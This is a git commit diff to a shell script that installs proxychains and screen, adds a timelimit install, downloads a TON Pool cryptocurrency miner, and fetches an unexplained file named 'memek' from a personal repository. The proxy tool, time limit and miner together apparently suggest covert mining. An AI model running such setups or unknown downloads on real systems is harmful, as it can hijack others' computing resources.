a91f7a070db9115e76c497852b9643c2ee9753f5
renilo <88342640+renilo@users.noreply.github.com>
2022-02-13 15:19:49 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -4,7 +4,10 @@ apt install proxychains
 
 apt install screen -y
 
+sudo apt install timelimit -y
+
 wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
+
 wget -q https://raw.githubusercontent.com/renilo/bh/main/memek
 
 tar -xvf  ton-pool.com-miner-0.3.4-linux.tar.gz
